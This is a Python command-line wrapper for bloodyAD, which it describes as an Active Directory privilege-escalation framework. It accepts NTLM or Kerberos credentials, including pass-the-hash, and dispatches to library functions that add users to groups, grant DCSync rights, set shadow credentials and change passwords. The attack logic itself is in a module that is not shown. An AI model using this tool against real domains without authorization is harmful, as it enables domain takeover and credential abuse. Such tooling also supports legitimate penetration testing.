# Credits to aclpwn
import argparse
from bloodyAD import ldap

def main():
    parser = argparse.ArgumentParser(description='Active Directory Privilege Escalation Framework', formatter_class=argparse.RawTextHelpFormatter)
    parser._optionals.title = 'Main options'
    parser._positionals.title = 'Required options'

    parser.add_argument('-d', '--domain', help='Domain used for NTLM authentication')
    parser.add_argument('-u', '--username', help='Username used for NTLM authentication')
    parser.add_argument('-p', '--password', help='Cleartext password or LMHASH:NTHASH for NTLM authentication')
    parser.add_argument('-k', '--kerberos', action='store_true', default=False)
    parser.add_argument('-s', '--scheme', help='Use LDAP over TLS (default is LDAP)')
    parser.add_argument('--host', help='Hostname or IP of the DC (ex: my.dc.local or 172.16.1.3)')

    parser.add_argument('function', help="Function to call with args following it:\n"
    # TODO Give DN if sAMAccountName doesn't work
    "\t addUserToGroup <member> <group>\n"
    "\t addDomainSync <sAMAccountName>\n"
    "\t setShadowCredentials <sAMAccountName>\n"
    "\t changePassword <sAMAccountName> <new_password>\n"
    "\t rpcChangePassword <sAMAccountName> <new_password>")
    parser.add_argument('params', help='Function parameters', nargs='+')

    args = parser.parse_args()

    if args.function == 'rpcChangePassword':
        ldap.rpcChangePassword(args.domain, args.username, args.password, args.host, *args.params)
    else:
        url = args.scheme + '://' + args.host
        conn = ldap.ldapConnect(url, args.domain, args.username, args.password, args.kerberos)
        if hasattr(args, 'function'):
            getattr(ldap,args.function)(conn, *args.params)
        
if __name__ == '__main__':
    main()
